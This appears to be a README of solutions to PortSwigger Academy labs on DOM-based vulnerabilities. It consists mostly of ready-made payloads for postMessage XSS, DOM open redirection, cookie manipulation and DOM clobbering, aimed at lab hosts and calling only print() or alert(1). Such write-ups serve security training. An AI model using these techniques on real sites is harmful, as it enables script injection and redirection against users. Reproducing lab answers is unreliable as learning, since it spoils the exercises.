
![Logo](https://github.com/cyber-insect99/photo-gallery-/blob/main/Blue%20Gradient%20Modern%20LinkedIn%20Banner.jpg?raw=true)
# DOM-based vulnerabilities







## [Lab-1] (https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages) , DOM XSS using web messages

This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.
- Go to the exploit server

```bash
  <iframe src="https://0aad00a403ef4bdf809e85bb002400ca.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">

```
![Logo](https://github.com/cyber-insect99/photo-gallery-/blob/main/portswigger%20lab.png?raw=true)

## Lab-2  , DOM XSS using web messages and a JavaScript URL

Go to the exploit server

```bash
  <iframe src="https://0a7300ab04ade806808f671e000300ee.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe>

```
## Lab-3  , DOM XSS using web messages and JSON.parse

Go to the exploit server

```bash
  <iframe src=https://0aa000730357be3b8085a37700830016.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>

```

## Lab-4  , DOM-based open redirection

Go to the Browser

```bash
https://0a3d009f041d7ba480b4088200c800c6.web-security-academy.net/post?postId=2&url=https://exploit-0a46008a047d7bb3808f07e7016200cf.exploit-server.net/

```
[YouTube video ](https://www.youtube.com/watch?v=pwM8cr_30hg)

## Lab-5  , DOM-based cookie manipulation

Go to the exploit server

```bash
 <iframe src="https://0ac2000304106e2d8031df12004800e4.web-security-academy.net/product?productId=11&'><script>print()</script>" onload="if(!window.x)this.src='https://0ac2000304106e2d8031df12004800e4.web-security-academy.net';window.x=1;"></iframe>

```
[YouTube video ](https://www.youtube.com/watch?v=pk3KjtoLMTc)


## Lab-6  , Exploiting DOM clobbering to enable XSS

Go to the exploit server

```bash
 <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```
[YouTube video ](https://www.youtube.com/watch?v=INUvcWQ3Pmc)


## Lab-7  , Clobbering DOM attributes to bypass HTML filters

Go to the exploit server

```bash
 <form id=x tabindex=0 onfocus=print()><input id=attributes>
<iframe 

```

```bash
 src=https://0a71004004c1f848800fbc6e005100fe.web-security-academy.net/post?postId=10 onload="setTimeout(()=>this.src=this.src+'#x',500)">

```
[YouTube video ](https://www.youtube.com/watch?v=34TB5FfNlko)




